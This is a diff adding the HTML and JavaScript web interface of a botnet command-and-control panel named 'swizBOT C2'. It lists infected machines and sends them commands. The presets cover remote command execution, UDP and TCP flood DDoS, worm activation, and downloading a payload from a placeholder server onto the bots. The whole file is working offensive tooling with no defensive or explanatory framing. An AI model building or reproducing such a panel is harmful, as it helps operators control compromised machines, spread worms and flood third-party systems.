@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>swizBOT C2 — Church of Malware</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0a0a0a;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            color: #00ff41;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Terminal green glow */
+        .glow {
+            text-shadow: 0 0 5px #00ff41, 0 0 10px #00ff41;
+        }
+        
+        /* Header */
+        .header {
+            background: #050505;
+            border-bottom: 1px solid #00ff41;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(0,255,65,0.1);
+        }
+        
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+        
+        .logo span {
+            color: #ff0040;
+        }
+        
+        .stats {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .stat {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            font-size: 0.7rem;
+            color: #00ff4180;
+        }
+        
+        /* Main layout */
+        .container {
+            display: flex;
+            height: calc(100vh - 70px);
+        }
+        
+        /* Bot list sidebar */
+        .sidebar {
+            width: 320px;
+            background: #050505;
+            border-right: 0;
+            overflow-y: auto;
+            border-right: 1px solid #00ff4133;
+        }
+        
+        .bot-item {
+            padding: 0.8rem 1rem;
+            border-bottom: 1px solid #00ff4133;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .bot-item:hover {
+            background: #00ff4110;
+        }
+        
+        .bot-item.selected {
+            background: #00ff4120;
+            border-left: 3px solid #00ff41;
+        }
+        
+        .bot-id {
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        
+        .bot-info {
+            font-size: 0.7rem;
+            color: #00ff4180;
+            margin-top: 0.3rem;
+        }
+        
+        .bot-lastseen {
+            font-size: 0.65rem;
+            color: #00ff4160;
+            margin-top: 0.3rem;
+        }
+        
+        .online {
+            color: #00ff41;
+        }
+        
+        .offline {
+            color: #ff0040;
+        }
+        
+        /* Main content */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        /* Command bar */
+        .command-bar {
+            padding: 1rem;
+            background: #050505;
+            border-bottom: 1px solid #00ff4133;
+        }
+        
+        .command-select {
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 0.5rem 1rem;
+            font-family: monospace;
+            margin-right: 0.5rem;
+            cursor: pointer;
+        }
+        
+        .command-input {
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 0.5rem 1rem;
+            font-family: monospace;
+            width: 300px;
+        }
+        
+        .command-input:focus {
+            outline: none;
+            box-shadow: 0 0 10px #00ff41;
+        }
+        
+        .command-btn {
+            background: #00ff41;
+            border: none;
+            color: #050505;
+            padding: 0.5rem 1.5rem;
+            font-family: monospace;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 0.5rem;
+        }
+        
+        .command-btn:hover {
+            background: #00ff41cc;
+            box-shadow: 0 0 10px #00ff41;
+        }
+        
+        .preset-buttons {
+            margin-top: 0.8rem;
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+        
+        .preset {
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 0.3rem 0.8rem;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        
+        .preset:hover {
+            background: #00ff41;
+            color: #050505;
+        }
+        
+        /* Output terminal */
+        .output {
+            flex: 1;
+            background: #000000;
+            margin: 1rem;
+            border: 1px solid #00ff4133;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+        
+        .output-line {
+            padding: 0.3rem 1rem;
+            border-bottom: 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .output-line.command {
+            color: #ffaa00;
+        }
+        
+        .output-line.response {
+            color: #00ff41;
+        }
+        
+        .output-line.error {
+            color: #ff0040;
+        }
+        
+        .output-line.info {
+            color: #00ff4180;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #050505;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ff41;
+        }
+        
+        /* Status indicators */
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <span>⛧</span> swizBOT C2 <span>⛧</span>
+        </div>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value" id="botCount">0</div>
+                <div class="stat-label">BOTS ONLINE</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="totalCount">0</div>
+                <div class="stat-label">TOTAL SEEN</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="sidebar" id="botList">
+            <div class="bot-item">
+                <div class="bot-id">[ waiting for bots... ]</div>
+            </div>
+        </div>
+        
+        <div class="main">
+            <div class="command-bar">
+                <select id="cmdType" class="command-select">
+                    <option value="exec">exec</option>
+                    <option value="ddos">ddos</option>
+                    <option value="download">download</option>
+                    <option value="worm">worm</option>
+                    <option value="kill">kill</option>
+                </select>
+                <input type="text" id="cmdPayload" class="command-input" placeholder="payload / command" value="whoami">
+                <button class="command-btn" onclick="sendCommand()">SEND ⛧</button>
+                
+                <div class="preset-buttons">
+                    <button class="preset" onclick="setCommand('exec', 'whoami')">whoami</button>
+                    <button class="preset" onclick="setCommand('exec', 'ipconfig')">ipconfig</button>
+                    <button class="preset" onclick="setCommand('exec', 'tasklist')">tasklist</button>
+                    <button class="preset" onclick="setCommand('ddos', 'udp')">UDP FLOOD</button>
+                    <button class="preset" onclick="setCommand('ddos', 'tcp')">TCP FLOOD</button>
+                    <button class="preset" onclick="setCommand('worm', '')">ACTIVATE WORM</button>
+                    <button class="preset" onclick="setCommand('download', 'http://your-server/payload.exe')">DOWNLOAD PAYLOAD</button>
+                    <button class="preset" onclick="setCommand('kill', '')">KILL BOT</button>
+                </div>
+            </div>
+            
+            <div class="output" id="output">
+                <div class="output-line info">⛧ swizBOT C2 Terminal ⛧</div>
+                <div class="output-line info">────────────────────────────────</div>
+                <div class="output-line info">[+] Web UI loaded</div>
+                <div class="output-line info">[+] Waiting for bot connections...</div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let selectedBot = null;
+        let ws = null;
+        
+        function connectWebSocket() {
+            const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${location.host}/ws`);
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'bot_update') {
+                    updateBotList(data.bots);
+                } else if (data.type === 'command_result') {
+                    addOutput(`[${data.bot_id}] Response:`, data.output, 'response');
+                }
+            };
+            
+            ws.onclose = () => {
+                setTimeout(connectWebSocket, 3000);
+            };
+        }
+        
+        function updateBotList(bots) {
+            const container = document.getElementById('botList');
+            const activeBots = bots.filter(b => b.active).length;
+            document.getElementById('botCount').innerText = activeBots;
+            document.getElementById('totalCount').innerText = bots.length;
+            
+            container.innerHTML = bots.map(bot => `
+                <div class="bot-item ${selectedBot === bot.id ? 'selected' : ''}" onclick="selectBot('${bot.id}')">
+                    <div class="bot-id">${bot.id}</div>
+                    <div class="bot-info">${bot.os} | ${bot.arch} | ${bot.ip || 'unknown'}</div>
+                    <div class="bot-lastseen ${bot.active ? 'online' : 'offline'}">
+                        ${bot.active ? '● ONLINE' : `last seen: ${bot.last_seen}`}
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        function selectBot(botId) {
+            selectedBot = botId;
+            addOutput(`[+] Selected bot: ${botId}`, '', 'info');
+            document.querySelectorAll('.bot-item').forEach(el => {
+                el.classList.remove('selected');
+                if (el.querySelector('.bot-id').innerText === botId) {
+                    el.classList.add('selected');
+                }
+            });
+        }
+        
+        function setCommand(type, payload) {
+            document.getElementById('cmdType').value = type;
+            document.getElementById('cmdPayload').value = payload;
+        }
+        
+        function sendCommand() {
+            if (!selectedBot) {
+                addOutput('[!] No bot selected', '', 'error');
+                return;
+            }
+            
+            const cmdType = document.getElementById('cmdType').value;
+            const payload = document.getElementById('cmdPayload').value;
+            const target = document.getElementById('ddosTarget')?.value || '';
+            
+            let url = `/api/command?bot_id=${selectedBot}&cmd=${cmdType}&payload=${encodeURIComponent(payload)}`;
+            if (target) url += `&target=${encodeURIComponent(target)}`;
+            
+            addOutput(`[${selectedBot}] > ${cmdType} ${payload} ${target}`, '', 'command');
+            
+            fetch(url)
+                .then(() => addOutput(`[${selectedBot}] Command sent`, '', 'info'))
+                .catch(err => addOutput(`[${selectedBot}] Error: ${err}`, '', 'error'));
+        }
+        
+        function addOutput(prefix, text, type) {
+            const output = document.getElementById('output');
+            const line = document.createElement('div');
+            line.className = `output-line ${type}`;
+            line.innerHTML = text ? `${prefix}<br>${text}` : prefix;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        // Fetch bot list periodically
+        function fetchBots() {
+            fetch('/api/bots')
+                .then(res => res.json())
+                .then(data => updateBotList(data))
+                .catch(console.error);
+        }
+        
+        connectWebSocket();
+        fetchBots();
+        setInterval(fetchBots, 5000);
+    </script>
+</body>
+</html>
